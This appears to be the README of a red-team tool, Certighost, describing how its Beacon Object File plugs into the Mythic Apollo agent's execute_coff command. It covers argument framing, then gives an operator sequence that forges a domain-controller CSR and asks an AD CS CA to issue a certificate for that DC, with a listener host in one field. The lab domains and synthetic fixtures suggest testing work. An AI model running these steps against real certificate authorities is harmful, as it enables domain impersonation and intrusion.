# Mythic integration

This repository integrates with Apollo's stock `execute_coff` command version `3`. It does not add a custom Mythic command, alias, plugin, or API task submission path. The BOF is registered through stock `register_file`, selected from the `execute_coff` file picker, and executed in memory with entrypoint `go`.

## Apollo v3 argument frame

The canonical task uses Apollo's actual typed-array schema:

```json
[
  ["base64", "<CSR_DER_BASE64>"],
  ["string", "<CA_HOST>\\<CA_NAME>"],
  ["string", "<TEMPLATE>"],
  ["string", "<SAN_DNS>"],
  ["string", "<CDC>"],
  ["string", "<RMD>"]
]
```

The deployed 233-line `execute_coff.py` source with SHA-256 `f6dfdfc6409ac28f17ecc6b0ec6c65f458767c663d340c30f5170c88ade4b2b6` leaves this typed array for the agent. Apollo's `execute_coff.cs` converts the `base64` and `string` entries to RunOF `-b` / `-z` arguments. RunOF `ParsedArgs.SerialiseArgs` then passes the raw buffer and its full length directly to `go`, with no outer payload-length word:

```text
u32 type=0, u32 length, data
```

The decoded `base64` DER and all five string slices are serialized as RunOF `BINARY=0` records. In `ParsedArgs.cs`, the `-z` path first calls `new OfArg(arg.Substring(3) + "\0")`, then `OfArg(string)` performs `Encoding.ASCII.GetBytes(arg_data + "\0")`, so each deployed typed string data slice contains exactly two terminal NUL bytes. The exact field order is:

```text
csr_der, ca_config, template, san_dns, cdc, rmd
```

Newer COFFLoader paths present a different accepted frame: one outer little-endian `u32` payload length followed by six `u32 length, data` slices whose typed strings carry exactly one terminal NUL. The BOF strict parser accepts both layouts directly and does not perform a second `BeaconDataParse` / `BeaconDataExtract` pass, because those loader APIs do not expose the same framing semantics. RunOF accepts either legacy all-base64 text slices with no NUL bytes or the exact two-terminal-NUL typed-string form, strips exactly both, and rejects one-NUL, three-or-more-NUL, and embedded-NUL forms. COFFLoader accepts either legacy all-base64 text slices with no NUL bytes or the canonical one-terminal-NUL typed-string form, strips one only in the latter case, and rejects double or embedded NULs. Once the leading `type=0` word selects RunOF framing, any later nonzero RunOF type tag fails closed. Required text fields must still be non-empty after normalization, and empty `san_dns` remains valid. New tasks must use the mixed schema above.

The offline descriptor stores the same canonical frame twice for review:

- `go_buffer_b64` is the exact deployed RunOF buffer received by `go`.
- `apollo_execute_coff_frame_hex` is the same no-outer/type-tag frame in hex.
- `field_types` is `["base64", "string", "string", "string", "string", "string"]`.

## Stock operator sequence

1. Build and hash the BOF locally.

```sh
make bof
shasum -a 256 build/certighost.x64.o
```

2. In the authorized Apollo callback, run `register_file`, use the file picker for `build/certighost.x64.o`, and verify `certighost.x64.o` appears in the `execute_coff` `-Coff` picker.

3. Generate a local DER CSR and copy its single-line base64 encoding.

```sh
umask 077
mkdir -p "$RUN_DIR"
openssl req -new -newkey rsa:2048 -nodes \
  -keyout "$RUN_DIR/target-dc.key.pem" \
  -out "$RUN_DIR/target-dc.csr.pem" \
  -subj "/CN=$TARGET_DC_DNS" \
  -addext "subjectAltName=DNS:$TARGET_DC_DNS"
openssl req -in "$RUN_DIR/target-dc.csr.pem" -outform DER \
  -out "$RUN_DIR/target-dc.csr.der"
openssl base64 -A -in "$RUN_DIR/target-dc.csr.der"
```

4. Paste one stock mixed command. Replace only the CSR base64 placeholder.

```text
execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:<CSR_DER_BASE64> string:ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA string:Machine string:ra-dc01.certighost.redantonetta.test string:ra-listener.certighost.redantonetta.test string:ra-dc01.certighost.redantonetta.test
```

5. Preserve the complete output and sanitized Mythic identifiers. Issuance returns `CERTIGHOST_RESULT disposition=3` plus one certificate block; a patched negative control returns `certighost: request not issued (...)` with no certificate block.

## Offline descriptor and evidence validation

The Python adapter is optional and offline-only. It is useful for tests, fixture generation, and evidence review, but it is not required for the stock command path.

Apollo's stock typed-array CLI splits argument tokens on spaces. The optional descriptor/helper path refuses text values containing spaces or edge quotes instead of emitting an operator command that would not reproduce the recorded frame; this does not narrow the BOF's packed-frame ABI.

```sh
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic describe-task \
  --callback-id '<MYTHIC_CALLBACK_ID>' \
  --agent-version '<EXACT_APOLLO_PAYLOAD_TYPE_VERSION>' \
  --coff-object build/certighost.x64.o \
  --csr-der '<OPERATOR_LOCAL_CSR_DER_PATH>' \
  --ca-config 'ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA' \
  --template 'Machine' \
  --san-dns 'ra-dc01.certighost.redantonetta.test' \
  --cdc 'ra-listener.certighost.redantonetta.test' \
  --rmd 'ra-dc01.certighost.redantonetta.test' \
  --output task-descriptor.json

PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
  validate-evidence tests/fixtures/mythic/vulnerable-success.json
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
  validate-evidence tests/fixtures/mythic/patched-negative-control.json
```

The fixture bundles are synthetic offline records. They prove schema, packing, output parsing, unchanged-filesystem evidence, repeatability, and rollback validation only; they are not live results.

## Constraints

- The adapter is pinned to Apollo `execute_coff` version `3` and rejects schema drift.
- The BOF never writes payloads, certificates, tickets, or temporary files on the target.
- The repository does not start SMB/LDAP listeners, perform PKINIT, collect hashes, or patch/revert a CA.
- The output parser accepts only the documented Certighost framing, including Apollo's newline-free issued-header plus certificate-marker aggregation.
